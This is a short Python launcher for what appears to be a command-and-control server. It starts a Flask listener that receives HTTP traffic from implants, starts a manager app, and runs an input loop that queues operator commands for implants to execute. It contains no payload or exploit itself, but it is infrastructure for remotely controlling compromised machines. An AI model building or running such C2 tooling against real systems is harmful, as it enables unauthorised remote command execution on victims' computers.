#!/usr/bin/python3

import _thread
import time
import Implant
from Listener import app
import ImplantManager



# This will have to be ready to recieve all HTTP requests, this will support ALL implants, and indivual domains for C" should be
#     controlled via Apache reverse proxies etc.
def Start_Listener( threadName, delay):
    App.run(debug=True, use_reloader=False, host='0.0.0.0', port=5000, threaded=True)

def Start_Controller(x,y):
   Manager.run(debug=True, use_reloader=False, host='0.0.0.0', port=5001, threaded=True)
   return


# Create two threads as follows:
App = app #Listener
Manager= ImplantManager.app
# Singleton in used to allow the app and the listeners to converse with implant object easily.
Imp = Implant.ImplantSingleton.instance

try:
   _thread.start_new_thread( Start_Listener, ("Thread-1", 2, ) )
   _thread.start_new_thread( Start_Controller, ("Thread-1", 2,))
except:
   print ("Error: unable to start thread")
time.sleep(1) # <- ??

# Legacy testing code - Remove shortly.
while 1:

   a  =input("Please enter the command you would like to execute:")
   Imp.AddCommand(a)
   print("Commands awaiting execution: ",Imp.QueuedCommands)




